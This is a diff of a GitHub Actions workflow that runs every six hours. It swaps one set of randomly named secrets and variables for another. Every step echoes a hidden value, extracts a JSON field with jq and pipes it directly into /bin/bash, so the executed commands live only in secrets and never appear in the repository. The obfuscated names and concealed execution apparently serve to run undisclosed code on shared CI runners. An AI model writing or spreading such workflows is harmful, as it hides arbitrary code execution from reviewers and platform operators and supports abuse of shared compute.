@@ -3,26 +3,24 @@ name: liulijun1819
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 0/6 * * *'
+    - cron: '8 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: liulijun1819
         env:
-          eccgs524: ${{ secrets.eccgs524 }}
+          f22: ${{ secrets.f22 }}
         run: |
-          echo $eccgs524 | jq -r .rl9156 | /bin/bash
-          echo $lpcik3992 | jq -r .eun9849 | /bin/bash
-          echo $ns5 | jq -r .mx8 | /bin/bash
-          echo $tzxv65 | jq -r .dxe46420 | /bin/bash
-          echo $dc0639 | jq -r .sahtb8 | /bin/bash
-          echo $jmvo5582 | jq -r .nift38 | /bin/bash
-          echo $gwj2 | jq -r .az84 | /bin/bash
-          echo $fo1 | jq -r .i8447 | /bin/bash
-          echo $ewpps0 | jq -r .by785 | /bin/bash
-          echo $bqml93 | jq -r .ngx690 | /bin/bash
-          echo $bh95 | jq -r .g134 | /bin/bash
+          echo $f22 | jq -r .jcdr98779 | /bin/bash
+          echo $kv2 | jq -r .y2377 | /bin/bash
+          echo $l65261 | jq -r .lp9576 | /bin/bash
+          echo $b894 | jq -r .bf96 | /bin/bash
+          echo $ir3437 | jq -r .qg482 | /bin/bash
+          echo $dh7642 | jq -r .rxflr5495 | /bin/bash
+          echo $mevrh15 | jq -r .lj0 | /bin/bash
+          echo $qtib149 | jq -r .bvq759 | /bin/bash
+          echo $jli86486 | jq -r .vx0 | /bin/bash
+          echo $v60194 | jq -r .v789 | /bin/bash
 
